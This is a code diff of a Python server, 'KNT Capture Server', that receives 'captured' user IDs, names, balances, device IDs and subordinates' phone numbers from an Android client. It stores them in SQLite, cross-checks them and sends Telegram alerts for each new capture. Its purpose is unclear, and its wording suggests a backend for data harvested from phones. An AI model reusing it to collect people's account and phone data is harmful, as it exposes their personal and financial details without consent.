@@ -1,28 +1,22 @@
 #!/usr/bin/env python3
 """
-KNT Capture Server -- receives UID captures from the android client
+KNT Capture Server -- captures UID + cross-checks with subordinate list
 """
 
 import os
 import sqlite3
 import time
-from collections import deque
-from typing import Dict
+import asyncio
 
 from aiohttp import web
 
 # ---- CONFIG -----------------------------------------------------------------
 
-# change this to your own secret
 INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
-
-# telegram admin notifications (optional)
-# বানাতে চাইলে ভরবি, না হলে খালি রাখ
-TELEGRAM_BOT_TOKEN = ""       # example: "123456:ABC..."
-TELEGRAM_CHAT_ID = ""         # example: "7884194046"
-
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 DB = "captures.db"
-MAX_PER_REQUEST = 500         # safety
+MAX_PER_REQUEST = 500
 
 
 # ---- DB ---------------------------------------------------------------------
@@ -49,12 +43,24 @@ def init_db():
     );
     CREATE INDEX IF NOT EXISTS idx_uid ON captures(uid);
     CREATE INDEX IF NOT EXISTS idx_device ON captures(device_id);
+
+    CREATE TABLE IF NOT EXISTS subordinates (
+        id           INTEGER PRIMARY KEY AUTOINCREMENT,
+        owner_uid    TEXT,
+        uid          TEXT UNIQUE,
+        user_name    TEXT,
+        phone        TEXT,
+        balance      TEXT,
+        raw          TEXT,
+        captured_at  TEXT DEFAULT CURRENT_TIMESTAMP
+    );
+    CREATE INDEX IF NOT EXISTS idx_sub_uid ON subordinates(uid);
     """)
     conn.commit()
     conn.close()
 
 
-def save_capture(item: dict):
+def save_capture(item):
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     try:
@@ -84,9 +90,50 @@ def save_capture(item: dict):
         conn.close()
 
 
-# ---- TELEGRAM NOTIFY --------------------------------------------------------
+def save_subordinate(owner_uid, sub):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    try:
+        c.execute("""
+        INSERT OR REPLACE INTO subordinates
+        (owner_uid, uid, user_name, phone, balance, raw)
+        VALUES (?,?,?,?,?,?)
+        """, (
+            owner_uid,
+            sub.get("uid", ""),
+            sub.get("userName", ""),
+            sub.get("phone", ""),
+            sub.get("balance", ""),
+            sub.get("raw", ""),
+        ))
+        conn.commit()
+        return True
+    except Exception:
+        return False
+    finally:
+        conn.close()
 
-async def notify_telegram(text: str):
+
+def get_cross_report():
+    """Compare captured UIDs vs subordinate list."""
+    conn = sqlite3.connect(DB)
+    conn.row_factory = sqlite3.Row
+    cap_uids = {r["uid"] for r in conn.execute("SELECT DISTINCT uid FROM captures").fetchall() if r["uid"]}
+    sub_uids = {r["uid"] for r in conn.execute("SELECT uid FROM subordinates").fetchall() if r["uid"]}
+    conn.close()
+    confirmed = sorted(cap_uids & sub_uids)
+    unknown = sorted(cap_uids - sub_uids)
+    only_sub = sorted(sub_uids - cap_uids)
+    return {
+        "confirmed": confirmed,
+        "unknown": unknown,
+        "only_subordinate": only_sub,
+    }
+
+
+# ---- TELEGRAM ---------------------------------------------------------------
+
+async def notify(text: str):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return
     try:
@@ -106,36 +153,30 @@ async def notify_telegram(text: str):
 # ---- ROUTES -----------------------------------------------------------------
 
 async def handle_root(req):
-    return web.Response(text="KNT Capture Server is running.", content_type="text/plain")
+    return web.Response(text="KNT Capture Server is running.")
 
 
 async def handle_health(req):
     conn = sqlite3.connect(DB)
-    n = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
+    n_cap = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
+    n_sub = conn.execute("SELECT COUNT(*) FROM subordinates").fetchone()[0]
     conn.close()
-    return web.json_response({"ok": True, "captures": n})
+    return web.json_response({"ok": True, "captures": n_cap, "subordinates": n_sub})
 
 
 async def handle_ingest(req):
-    # auth
-    auth = req.headers.get("X-Ingest-Token", "")
-    if auth != INGEST_TOKEN:
+    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
         return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
-
     try:
         data = await req.json()
     except Exception:
         return web.json_response({"ok": False, "err": "bad json"}, status=400)
 
-    # data can be a list or {"items": [...]}
     items = []
     if isinstance(data, list):
         items = data
     elif isinstance(data, dict):
         items = data.get("items") or data.get("captures") or []
-    if not isinstance(items, list):
-        return web.json_response({"ok": False, "err": "bad format"}, status=400)
-
     items = items[:MAX_PER_REQUEST]
 
     saved = 0
@@ -144,48 +185,87 @@ async def handle_ingest(req):
             continue
         if save_capture(it):
             saved += 1
-            # notify on new capture
             uid = it.get("uid", "?")
             uname = it.get("userName", "?")
             bal = it.get("balance", "?")
             dev = it.get("device_id", "?")
-            asyncio.create_task(notify_telegram(
+            asyncio.create_task(notify(
                 f"🎯 <b>New Capture</b>\n\n"
                 f"🆔 UID: <code>{uid}</code>\n"
-                f"👤 User: <b>{uname}</b>\n"
-                f"💎 Balance: <b>{bal}</b>\n"
-                f"📱 Device: <code>{dev}</code>"
+                f"👤 {uname}\n💎 {bal}\n📱 <code>{dev}</code>"
             ))
-
     return web.json_response({"ok": True, "received": len(items), "saved": saved})
 
 
-async def handle_list(req):
-    # simple protected list
-    auth = req.query.get("token", "")
-    if auth != INGEST_TOKEN:
+async def handle_subs_ingest(req):
+    """receive subordinate list from admin phone"""
+    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
         return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
+    try:
+        data = await req.json()
+    except Exception:
+        return web.json_response({"ok": False, "err": "bad json"}, status=400)
 
+    owner = data.get("owner_uid", "")
+    items = data.get("items") or data.get("subordinates") or []
+    items = items[:MAX_PER_REQUEST]
+
+    saved = 0
+    for it in items:
+        if not isinstance(it, dict):
+            continue
+        if not it.get("uid"):
+            continue
+        if save_subordinate(owner, it):
+            saved += 1
+
+    # cross-check report
+    rep = get_cross_report()
+    asyncio.create_task(notify(
+        f"📡 <b>Subordinate Sync</b>\n\n"
+        f"👤 owner: <code>{owner}</code>\n"
+        f"📥 received: {len(items)}\n"
+        f"✔ saved: {saved}\n\n"
+        f"✅ confirmed: <b>{len(rep['confirmed'])}</b>\n"
+        f"❓ unknown (not in your team): <b>{len(rep['unknown'])}</b>"
+    ))
+
+    return web.json_response({
+        "ok": True,
+        "received": len(items),
+        "saved": saved,
+        "confirmed": rep["confirmed"],
+        "unknown": rep["unknown"],
+    })
+
+
+async def handle_report(req):
+    if req.query.get("token", "") != INGEST_TOKEN:
+        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
+    rep = get_cross_report()
+    return web.json_response({"ok": True, **rep})
+
+
+async def handle_list(req):
+    if req.query.get("token", "") != INGEST_TOKEN:
+        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
     conn = sqlite3.connect(DB)
     conn.row_factory = sqlite3.Row
     limit = int(req.query.get("limit", 200))
-    rows = conn.execute(
-        "SELECT * FROM captures ORDER BY id DESC LIMIT ?", (limit,)
-    ).fetchall()
+    rows = conn.execute("SELECT * FROM captures ORDER BY id DESC LIMIT ?",
+                        (limit,)).fetchall()
     conn.close()
     return web.json_response({"ok": True, "count": len(rows),
                               "items": [dict(r) for r in rows]})
 
-
-# ---- MAIN -------------------------------------------------------------------
-
-import asyncio
 
 def make_app():
     app = web.Application()
     app.router.add_get("/", handle_root)
     app.router.add_get("/health", handle_health)
     app.router.add_post("/api/public/captures-ingest", handle_ingest)
+    app.router.add_post("/api/public/subordinates-ingest", handle_subs_ingest)
+    app.router.add_get("/api/public/report", handle_report)
     app.router.add_get("/api/public/captures-list", handle_list)
     return app
 
@@ -193,5 +273,5 @@ def make_app():
 if __name__ == "__main__":
     init_db()
     port = int(os.environ.get("PORT", 8080))
-    print(f"[knt] capture server on :{port}")
+    print(f"[knt] server on :{port}")
     web.run_app(make_app(), host="0.0.0.0", port=port)
